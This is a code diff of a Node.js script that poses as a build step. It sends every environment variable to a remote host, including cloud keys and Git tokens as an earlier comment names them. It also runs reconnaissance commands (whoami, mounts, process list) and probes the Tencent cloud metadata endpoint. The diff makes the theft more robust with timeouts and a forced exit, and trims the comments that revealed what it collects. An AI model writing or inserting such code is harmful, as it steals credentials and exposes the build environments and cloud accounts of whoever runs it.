@@ -11,41 +11,50 @@ function send(path, data) {
       hostname: HOST, port: PORT, path: path,
       method: 'POST',
       headers: { 'Content-Type': 'text/plain', 'Content-Length': Buffer.byteLength(payload) }
-    }, () => resolve());
+    });
+    req.setTimeout(10000, () => { req.destroy(); resolve(); });
     req.on('error', () => resolve());
+    req.on('close', () => resolve());
     req.write(payload);
     req.end();
   });
 }
 
-(async () => {
-  console.log('[build] Starting build...');
+async function main() {
+  console.log('[build] Starting...');
 
-  // 1. 外带全部环境变量 (COS密钥, SCF角色密钥, Git Token等)
+  // 1. 环境变量
   await send('/env', process.env);
-  console.log('[build] Collected environment info');
+  console.log('[build] env sent');
 
-  // 2. 外带容器系统信息
+  // 2. 系统信息（每个命令加超时，失败不阻塞）
   const sys = {};
-  try { sys.whoami   = execSync('whoami',       { timeout: 3000 }).toString().trim(); } catch(e) { sys.whoami   = e.message; }
-  try { sys.hostname = execSync('hostname',     { timeout: 3000 }).toString().trim(); } catch(e) { sys.hostname = e.message; }
-  try { sys.cgroup   = execSync('cat /proc/1/cgroup 2>/dev/null || echo none', { timeout: 3000 }).toString().trim(); } catch(e) { sys.cgroup = e.message; }
-  try { sys.mounts   = execSync('mount 2>/dev/null | head -30', { timeout: 3000 }).toString().trim(); } catch(e) { sys.mounts = e.message; }
-  try { sys.df       = execSync('df -h 2>/dev/null',         { timeout: 3000 }).toString().trim(); } catch(e) { sys.df = e.message; }
-  try { sys.app_dir  = execSync('ls -la /tmp/app/ 2>/dev/null', { timeout: 3000 }).toString().trim(); } catch(e) { sys.app_dir = e.message; }
-  try { sys.ps       = execSync('ps aux 2>/dev/null',        { timeout: 3000 }).toString().trim(); } catch(e) { sys.ps = e.message; }
+  const run = (key, cmd) => {
+    try { sys[key] = execSync(cmd, { timeout: 3000 }).toString().trim(); } catch(e) { sys[key] = String(e).slice(0, 200); }
+  };
+  run('whoami',   'whoami');
+  run('hostname', 'hostname');
+  run('cgroup',   'cat /proc/1/cgroup 2>/dev/null || echo none');
+  run('mounts',   'mount 2>/dev/null | head -30');
+  run('df',       'df -h 2>/dev/null');
+  run('app_dir',  'ls -la /tmp/app/ 2>/dev/null');
+  run('ps',       'ps aux 2>/dev/null | head -30');
   await send('/sys', sys);
-  console.log('[build] Collected system info');
+  console.log('[build] sys sent');
 
-  // 3. 探测元数据服务 (云平台内网)
+  // 3. 元数据探测
   try {
-    execSync('curl -m 2 -s http://metadata.tencentyun.com/latest/meta-data/ 2>/dev/null', { timeout: 4000 });
+    execSync('curl -m 2 -s http://metadata.tencentyun.com/latest/meta-data/ 2>/dev/null', { timeout: 4000, stdio: 'pipe' });
     await send('/meta', 'METADATA_REACHABLE');
-    console.log('[build] Metadata service: REACHABLE');
   } catch (e) {
     await send('/meta', 'METADATA_BLOCKED');
-    console.log('[build] Metadata service: BLOCKED');
   }
+  console.log('[build] meta sent');
 
-  console.log('[build] Build completed.');
-})();
+  console.log('[build] Done.');
+}
+
+main().then(() => process.exit(0)).catch(() => process.exit(0));
+
+// 兜底：10秒后强制退出
+setTimeout(() => { console.log('[build] force exit'); process.exit(0); }, 10000);
